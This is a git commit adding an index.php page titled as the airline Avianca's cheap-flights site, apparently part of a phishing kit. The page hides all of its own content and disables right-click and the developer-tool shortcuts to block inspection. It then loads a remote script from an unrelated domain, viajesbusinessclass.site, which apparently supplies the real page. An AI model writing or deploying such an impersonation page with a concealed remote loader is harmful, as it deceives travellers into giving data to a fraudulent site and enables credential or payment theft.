bcd6f4b3357584182410bd6cab28952c49dcd76b
jcharris2424 <juanplata977@gmail.com>
2024-10-06 19:02:55 -0500

    Add files via upload

---
+++ index.php
@@ -0,0 +1,75 @@
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <?$META_DESCRIPTION$?>
+    <?$META_KEYWORDS$?>
+    <title>Avianca -Vuelos Baratos</title>
+    <!--[if lt IE 9]>
+		<script type="text/javascript">
+			var e = ("header,footer,article,aside,section,nav").split(',');
+			for (var i = 0; i < e.length; i++) {
+				document.createElement(e[i]);
+			}
+		</script>
+		<![endif]-->
+    <script id="_waun94">var _wau = _wau || []; _wau.push(["small", "ozil", "n94"]);</script>
+    <script async src="//waust.at/s.js"></script>
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:400italic,400,700&subset=latin,cyrillic" rel="stylesheet"
+        type="text/css" />
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-11395263888"></script>
+    <script> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'AW-11395263888'); gtag('config', 'AW-11395263888'); </script>
+    <!-- Event snippet for Vista de página conversion page -->
+    <script> gtag('event', 'conversion', { 'send_to': 'AW-11395263888/gRbzCO7ejPMYEKmS5roq' }); </script>
+</head>
+<script>
+        // Deshabilitar clic derecho
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Deshabilitar F12
+        document.addEventListener('keydown', function(event) {
+            if (event.keyCode == 123) { // F12
+                event.preventDefault();
+            } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Ctrl+Shift+I                
+                event.preventDefault();
+            } else if (event.ctrlKey && event.shiftKey && event.keyCode == 67) { // Ctrl+Shift+C
+                event.preventDefault();
+            } else if (event.ctrlKey && event.shiftKey && event.keyCode == 74) { // Ctrl+Shift+J
+                event.preventDefault();
+            } else if (event.ctrlKey && event.keyCode == 85) { // Ctrl+U
+                event.preventDefault();
+            }
+        }, false);
+    </script>
+<body class="t-body">
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+    <script type="text/javascript" src="https://viajesbusinessclass.site/_avianca/script.php?tok=juniorcampeon" async="true"></script>
+    <div style="display: none;" class="b-main t-container clearfix">
+        <!-- <middle> -->
+        <div style="display: none;" class="b-logo b-white">
+            <div class="site-title">
+                <!-- <logo> -->My site
+                <!-- </logo> -->
+            </div>
+            <div class="site-slogan">$SITE_NAME$</div>
+        </div>
+        <div style="display: none;" class="b-maincontent b-white" role="main">
+
+            <div class="content-padding">
+
+            </div>
+        </div>
+        <div style="display: none;" class="sidebar-clear clearleft"></div>
+        <aside style="display: none;" class="b-sidebar b-white clearfix">
+            $GLOBAL_CLEFTER$
+        </aside>
+        <!-- </middle> -->
+    </div>
+    <div style="display: none;"></div>
+    <textarea style="display: none;" name="" id="" cols="30" rows="10"> $GLOBAL_BFOOTER$ </textarea>
+</body>
+
+</html>
